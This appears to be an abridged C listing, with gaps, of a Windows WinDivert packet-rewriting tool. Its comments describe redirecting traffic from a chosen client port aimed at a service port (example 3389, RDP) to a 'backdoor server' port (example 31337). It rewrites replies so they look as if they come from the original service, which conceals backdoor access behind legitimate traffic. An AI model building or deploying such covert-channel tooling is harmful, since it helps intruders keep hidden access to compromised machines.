...
int __cdecl main(int argc, char **argv)
{
	...
	case 6:
		...
		if (strcmp(argv[5], "disablechecksum") == 0){
			disablechecksum = TRUE;
		}
	...
	default:
		fprintf(stderr, "usage: %s client_sourceport original_dstport new_dstport [disablechecksum] [debug]\n",
			argv[0]);
		fprintf(stderr, "examples:\n");
		fprintf(stderr, "\t%s 1337 3389 31337 \n", argv[0]);
		fprintf(stderr, "\t%s 1337 3389 31337 disablechecksum debug\n",
			argv[0]);
		exit(EXIT_FAILURE);
	}
	...
	cx = sprintf_s(filter, sizeof(filter),
		"((inbound and tcp.SrcPort == %s and tcp.DstPort == %s )"
		" or (outbound and tcp.SrcPort == %s and tcp.DstPort == %s ))",
	...
	while (TRUE)
	{
		...
		if (tcp_header->Syn && !tcp_header->Ack)
		{
			...
			if (debug){
				printf("%s", "This is a SYN packet, storing src and dst ip.\n");
			}
		}
		...
		if (payload == NULL) {
			...
			if (ntohs(tcp_header->DstPort) == atoi(argv[2]))
			{
				//printf("%s", "C->S\n");
				pack->tcp.SrcPort = tcp_header->SrcPort;
				pack->tcp.DstPort = htons(atoi(argv[3]));
			}

			//when traffic from backdoor server to client
			if (ntohs(tcp_header->DstPort) == atoi(argv[1]))
			{
				pack->tcp.SrcPort = htons(atoi(argv[2]));
				pack->tcp.DstPort = tcp_header->DstPort;
			...
			if (!disablechecksum){
				WinDivertHelperCalcChecksums((PVOID)pack, packet_len,
					0);
			}
		...
		// packet with data
			...
			if (ntohs(tcp_header->DstPort) == atoi(argv[2]))
			{
				...
				divert->header.tcp.DstPort = htons(atoi(argv[3]));
			}

			//when traffic from backdoor server to client
			if (ntohs(tcp_header->DstPort) == atoi(argv[1]))
			{
				divert->header.tcp.SrcPort = htons(atoi(argv[2]));
				divert->header.tcp.DstPort = tcp_header->DstPort;
